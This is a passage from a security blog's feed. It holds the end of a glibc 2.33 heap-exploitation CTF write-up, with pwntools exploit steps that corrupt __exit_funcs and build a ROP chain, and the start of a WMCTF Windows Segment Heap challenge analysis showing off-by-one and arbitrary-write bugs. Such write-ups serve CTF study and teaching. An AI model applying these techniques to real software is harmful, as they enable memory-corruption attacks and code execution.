class="line"><span class="comment"># arbitrary_write(heap_base + 0x20, p64(4) + p64(encoded_rdi2rdx)) # exit_function_list-&gt;fns[0].flavor = ef_cxa(0x4), exit_function_list-&gt;fns[0].cxa.fn = rdi2rdx</span></span><br><span class="line"><span class="comment"># arbitrary_write(heap_base + 0x30, p64(ropchain_addr)) # exit_function_list-&gt;fns[0].cxa.arg = ropchain_addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # prepare fastbin</span></span><br><span class="line"><span class="comment"># add(1)</span></span><br><span class="line"><span class="comment"># for i in range(5):</span></span><br><span class="line"><span class="comment">#     add(2)</span></span><br><span class="line"><span class="comment">#     edit(2, p64((heap_base + 0x3f0 + 0x20 * i) ^ (heap_base &gt;&gt; 12)))</span></span><br><span class="line"><span class="comment"># add(2)</span></span><br><span class="line"><span class="comment"># edit(2, p64((libc_base + 0x1E0738 - 0x18) ^ (heap_base &gt;&gt; 12))) # __exit_funcs</span></span><br><span class="line"><span class="comment"># edit(0, "\x07") # "fill" the tcache bin</span></span><br><span class="line"><span class="comment"># delete(1) # put into fastbin</span></span><br><span class="line"><span class="comment"># edit(1, p64((heap_base + 0x3d0) ^ (heap_base &gt;&gt; 12))) # prepare for fastbin reverse into tcache attack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # fastbin reverse into tcache attack, this will change __exit_funcs</span></span><br><span class="line"><span class="comment"># edit(0, "\x00") # "clear" the tcache bin</span></span><br><span class="line"><span class="comment"># add(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # clear fastbin</span></span><br><span class="line"><span class="comment"># edit(0, "\x07")</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># edit(1, p64(heap_base &gt;&gt; 12))</span></span><br><span class="line"><span class="comment"># edit(0, "\x00")</span></span><br><span class="line"><span class="comment"># add(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # trigger exit</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># edit(0, "\x02")</span></span><br><span class="line"><span class="comment"># edit(1, p64((heap_base + 0x2000) ^ (heap_base &gt;&gt; 12)))</span></span><br><span class="line"><span class="comment"># add(1)</span></span><br><span class="line"><span class="comment"># add(2)</span></span><br><span class="line"><span class="comment"># ##################################### </span></span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">_exit_funcs (struct exit_functions_list **):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">struct exit_function_list</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    struct exit_function_list *next;</span></span><br><span class="line"><span class="string">    size_t idx;</span></span><br><span class="line"><span class="string">    struct exit_function fns[32];</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">struct exit_function</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    /* `flavour' should be of type of the `enum' above but since we need</span></span><br><span class="line"><span class="string">       this element in an atomic operation we have to use `long int'.  */</span></span><br><span class="line"><span class="string">    long int flavor;</span></span><br><span class="line"><span class="string">    union</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        void (*at) (void);</span></span><br><span class="line"><span class="string">        struct</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            void (*fn) (int status, void *arg);</span></span><br><span class="line"><span class="string">            void *arg;</span></span><br><span class="line"><span class="string">        &#125; on;</span></span><br><span class="line"><span class="string">        struct</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            void (*fn) (void *arg, int status);</span></span><br><span class="line"><span class="string">            void *arg;</span></span><br><span class="line"><span class="string">            void *dso_handle;</span></span><br><span class="line"><span class="string">        &#125; cxa;</span></span><br><span class="line"><span class="string">    &#125; func;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">_rtld_global-&gt;_dl_ns[0]-&gt;_ns_loaded: (link map) </span></span><br><span class="line"><span class="string">offset           member</span></span><br><span class="line"><span class="string">0x0              l_addr         (point to program base by default)</span></span><br><span class="line"><span class="string">0x18             l_next         (point to next link map, the length of the linked list should be no smaller than 4, and the tial nodes's l_next = 0)</span></span><br><span class="line"><span class="string">0x20             l_prev         (point to previous link map, head node's l_prev = 0)</span></span><br><span class="line"><span class="string">0x110            l_info[0x1A]   (</span></span><br><span class="line"><span class="string">                                    point to fini_array Elf64_Dyn structure:</span></span><br><span class="line"><span class="string">                                    typedef struct</span></span><br><span class="line"><span class="string">                                    &#123;</span></span><br><span class="line"><span class="string">                                    Elf64_Sxwordd_tag;/* Dynamic entry type */</span></span><br><span class="line"><span class="string">                                    union</span></span><br><span class="line"><span class="string">                                        &#123;</span></span><br><span class="line"><span class="string">                                            Elf64_Xword d_val;/* Integer value */             </span></span><br><span class="line"><span class="string">                                            Elf64_Addr d_ptr;    /* Address value */       </span></span><br><span class="line"><span class="string">                                                                    // l_info[0x1A]-&gt;d_un.d_ptr + l_addr = &amp;fini_array</span></span><br><span class="line"><span class="string">                                        &#125; d_un;</span></span><br><span class="line"><span class="string">                                    &#125; Elf64_Dyn;)</span></span><br><span class="line"><span class="string">                                )</span></span><br><span class="line"><span class="string">0x120            l_info[0x1C]   (point to fini_array_size Elf64_Dyn structure)        //  l_info[0x1C]-&gt;d_un.d_val= sizeof(fini_array)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">struct _IO_FILE</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  int _flags;/* High-order word is _IO_MAGIC; rest is flags. */              0x10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  /* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line"><span class="string">  char *_IO_read_ptr;/* Current read pointer */                                  0x18</span></span><br><span class="line"><span class="string">  char *_IO_read_end;/* End of get area. */                                      0x20</span></span><br><span class="line"><span class="string">  char *_IO_read_base;/* Start of putback+get area. */                            0x28</span></span><br><span class="line"><span class="string">  char *_IO_write_base;/* Start of put area. */                                    0x30</span></span><br><span class="line"><span class="string">  char *_IO_write_ptr;/* Current put pointer. */                                  0x38</span></span><br><span class="line"><span class="string">  char *_IO_write_end;/* End of put area. */                                      0x40</span></span><br><span class="line"><span class="string">  char *_IO_buf_base;/* Start of reserve area. */                                0x48</span></span><br><span class="line"><span class="string">  char *_IO_buf_end;/* End of reserve area. */                                  0x50</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  /* The following fields are used to support backing up and undo. */</span></span><br><span class="line"><span class="string">  char *_IO_save_base; /* Pointer to start of non-current get area. */              0x58</span></span><br><span class="line"><span class="string">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */     0x60</span></span><br><span class="line"><span class="string">  char *_IO_save_end; /* Pointer to end of non-current get area. */                 0x68</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  struct _IO_marker *_markers;                                                      0x70</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  struct _IO_FILE *_chain;                                                          0x78</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  int _fileno;                                                                      0x80</span></span><br><span class="line"><span class="string">  int _flags2;                                                                      0x84</span></span><br><span class="line"><span class="string">  __off_t _old_offset; /* This used to be _offset but it's too small.  */           </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  /* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line"><span class="string">  unsigned short _cur_column;</span></span><br><span class="line"><span class="string">  signed char _vtable_offset;</span></span><br><span class="line"><span class="string">  char _shortbuf[1];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  _IO_lock_t *_lock;</span></span><br><span class="line"><span class="string">#ifdef _IO_USE_OLD_IO_FILE</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://www.anquanke.com/post/id/222948" target="_blank" rel="noopener">https://www.anquanke.com/post/id/222948</a></li><li><a href="https://www.anquanke.com/post/id/242640" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242640</a></li><li><a href="https://elixir.bootlin.com/glibc/glibc-2.33" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.33</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Glibc 2.33怎么玩？&lt;/p&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.com/categories/Writeup/"/>
    
      <category term="Summary" scheme="https://n0nop.com/categories/Writeup/Summary/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>从WMCTF winpwn中学习Segment Heap</title>
    <link href="https://n0nop.com/2021/09/20/%E4%BB%8EWMCTF-winpwn%E4%B8%AD%E5%AD%A6%E4%B9%A0Segment-Heap/"/>
    <id>https://n0nop.com/2021/09/20/%E4%BB%8EWMCTF-winpwn%E4%B8%AD%E5%AD%A6%E4%B9%A0Segment-Heap/</id>
    <published>2021-09-20T11:08:51.000Z</published>
    <updated>2021-10-05T02:31:05.252Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/253047" target="_blank" rel="noopener">https://www.anquanke.com/post/id/253047</a></p><p>比赛的时候没注意，一直把这题当成Nt Heap去做了，最后无功而返，准备等一下官方的writeup学习一下。结果最后没有公布，只能自己再摸索一番了，才发现是个Segment Heap题，由于之前也没有接触过，就比较针对性地学习了一下，同时分享一下解题思路，如果有错误还请批评指正。</p><a id="more"></a><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><h2 id="FrontEndHeapDebugOptions"><a href="#FrontEndHeapDebugOptions" class="headerlink" title="FrontEndHeapDebugOptions"></a>FrontEndHeapDebugOptions</h2><p>首先题目提供的附件中有一个<code>start.bat</code>：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\easy_wm_winpwn.exe"</span> /v FrontEndHeapDebugOptions /t REG_DWORD /d <span class="number">0x8</span> /f</span><br></pre></td></tr></table></figure><p>通过搜索<code>FrontEndHeapDebugOptions</code>，可以找到BlackHat 2016的一个<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf" target="_blank" rel="noopener">PDF</a>，其中介绍的就是Windows Segment Heap的机制，本文也是从学习这个PDF而来的。</p><p>其中对于<code>FrontEndHeapDebugOptions</code>有解释：</p><p><img src="https://p5.ssl.qhimg.com/t01ca7141bffd1458e7.png" alt="FrontEndHeapDebugOptions" title="FrontEndHeapDebugOptions"></p><p>这说明这题不是Nt Heap，而是Segment Heap，两种Heap差别还是很大的。至于如何分辨这个Heap是Nt Heap还是Segment Heap，则可通过windbg调试确定：</p><p><img src="https://p4.ssl.qhimg.com/t01078a13605c6c8a18.png" alt="Segment Heap" title="Segment Heap"></p><h2 id="主要逻辑"><a href="#主要逻辑" class="headerlink" title="主要逻辑"></a>主要逻辑</h2><p>程序的逻辑并不复杂，只是套了许多小菜单，总的来说还是可以视为传统的菜单题。</p><p>简单来说，程序的功能就是注册用户，然后以某个用户的身份进行打怪的游戏，胜利之后可以进入到堆内存的操作逻辑。</p><p>其中，User management的菜单：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">management</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> var14[<span class="number">5</span>]; <span class="comment">// [rsp+24h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"========================="</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1.Create user"</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"2.Show user information"</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"3.Edit user name"</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"4.ret"</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"========================="</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Your choice: "</span>);</span><br><span class="line">          <span class="built_in">scanf</span>(<span class="string">"%d"</span>, var14);</span><br><span class="line">          getchar();</span><br><span class="line">          result = var14[<span class="number">0</span>];</span><br><span class="line">          <span class="keyword">if</span> ( var14[<span class="number">0</span>] != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          create();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( var14[<span class="number">0</span>] != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( var14[<span class="number">0</span>] != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( var14[<span class="number">0</span>] == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关的user结构体我们定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">80</span>];</span><br><span class="line">    <span class="keyword">char</span> is_vip;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">int</span> hurt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个菜单中的漏洞是<code>edit</code>的时候引入了off by one：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+20h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+24h] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please enter user id:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">3</span> || v2 &lt; <span class="number">0</span> || v2 &gt; max_id )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid id"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="built_in">puts</span>(<span class="string">"Please enter username:"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x50</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    result = v1;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    users[v2].name[i] = v1;</span><br><span class="line">    result = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以可以通过name溢出到<code>is_vip</code>这个标志。</p><p>其次，一个没有在打印出来的菜单中显示出来的功能<code>case 202108</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bonus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD rax5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> var18; <span class="comment">// [rsp+20h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> var14[<span class="number">5</span>]; <span class="comment">// [rsp+24h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please enter user id:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;var18);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( var18 &gt; <span class="number">3</span> || var18 &lt; <span class="number">0</span> || var18 &gt; max_id )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid id"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  LODWORD(rax5) = (<span class="keyword">unsigned</span> __int8)users[var18].is_vip;</span><br><span class="line">  <span class="keyword">if</span> ( users[var18].is_vip )</span><br><span class="line">  &#123;</span><br><span class="line">    var14[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, var14);</span><br><span class="line">    LODWORD(rax5) = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( var14[<span class="number">0</span>] &lt; <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      rax5 = <span class="number">100</span>i64 * var18;</span><br><span class="line">      users[rax5 / <span class="number">0x64</span>].hurt = var14[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> rax5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里发现只要<code>is_vip != 0</code>，就可以编辑<code>user.hurt</code>的值，配合上面的<code>edit</code>，我们就可以设置<code>hurt</code>为任意小于100的值，不难注意到可以是负数。</p><p>另外，<code>buy</code>功能提供了一个比较奇怪的操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">buy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> var18[<span class="number">6</span>]; <span class="comment">// [rsp+20h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please enter user id:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, var18);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( var18[<span class="number">0</span>] &gt; <span class="number">3u</span> || var18[<span class="number">0</span>] &gt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)max_id )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid id"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( users[var18[<span class="number">0</span>]].score &gt; <span class="number">0x98967F</span>u &amp;&amp; !used )</span><br><span class="line">  &#123;</span><br><span class="line">    used = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You can get a huge gift because you defeated the monster"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, var18);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> ( var18[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( var18[<span class="number">0</span>] &lt; <span class="number">0x500</span>u )</span><br><span class="line">        *(_QWORD *)(ptr - (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">8</span> * var18[<span class="number">0</span>])) = read_ll();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是在<code>user.score &gt; 0x98967F</code>的时候，允许对<code>ptr</code>指向的位置进行上溢的修改操作，但只有一次机会。</p><p>之后就是主题部分，game的逻辑了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"========  Arena  ========="</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"1.Attack a L1near Monster"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2.Improve combat effectiveness"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3.Glory wall"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"4.ret"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"========================="</span>);</span><br></pre></td></tr></table></figure><p>这部分也比较简单，攻击的时候，只要<code>user.hurt &gt; rand() % 1000</code>即可，且这里是无符号比较，只要利用上面的编辑<code>hurt</code>的功能修改为负数即可。</p><p>这样满足条件之后，就能提供三种<code>tip</code>使用，这里定义tip的结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tip</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> user_id;</span><br><span class="line">    glory *glory;</span><br><span class="line">    __int64 secret;</span><br><span class="line">    <span class="keyword">int</span> type;</span><br><span class="line">    <span class="keyword">char</span> not_in_wall;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结合<code>Glory Wall</code>的逻辑，这三种tip分别用途不同：</p><ul><li><p>tip1：只能做任意大小（0x20 ~ 0x80500）的<code>HeapAlloc</code>和<code>HeapFree</code>（私有堆）。</p></li><li><p>tip2：只能做固定大小（0x20 和 0x20000）的<code>HeapAlloc</code>和<code>HeapFree</code>，且只能对<code>0x20000</code>的块进行<code>edit</code>以及<code>show</code>。</p></li><li><p>tip3：在<code>idx = 0</code>的时候，故意引入了一个除以0的异常：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">3</span> &amp;&amp; tip3_unused == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    Destination = (<span class="keyword">char</span> *)HeapAlloc(hHeap, <span class="number">8u</span>, <span class="number">0x100</span>ui64);</span><br><span class="line">    tips[idx].glory = (glory *)Destination;</span><br><span class="line">    tips[idx].type = <span class="number">3</span>;</span><br><span class="line">    tips[idx].user_id = a1;</span><br><span class="line">    tips[idx].not_in_wall = <span class="number">1</span>;</span><br><span class="line">    tips[idx].secret = (__int64)tips[idx].glory ^ <span class="number">0x1A1A2B2B3C3C4D4D</span>i64;</span><br><span class="line">    <span class="built_in">strncpy</span>(Destination, <span class="string">"You are a hero"</span>, <span class="number">0x10</span>ui64);</span><br><span class="line">    v9 = <span class="number">100</span> / idx++;</span><br><span class="line">    tip3_unused = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相应的异常处理函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">text</span>:<span class="number">00007F</span>F6A2C72036 loc_7FF6A2C72036:                       ; DATA XREF: .rdata:<span class="number">00007F</span>F6A2C75150↓o</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00007F</span>F6A2C72036 ;   __except(loc_7FF6A2C73BD0) <span class="comment">// owned by 7FF6A2C71F39</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00007F</span>F6A2C72036                 mov     eax, <span class="number">20</span>h ; <span class="string">' '</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00007F</span>F6A2C7203B                 imul    rax, <span class="number">0</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00007F</span>F6A2C7203F                 lea     rcx, tips</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00007F</span>F6A2C72046                 mov     rax, [rcx+rax+<span class="number">8</span>]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00007F</span>F6A2C7204B                 mov     cs:ptr, rax</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00007F</span>F6A2C72052                 mov     eax, cs:idx</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00007F</span>F6A2C72058                 inc     eax</span><br><span class="line">.<span class="built_in">text</span>:<span 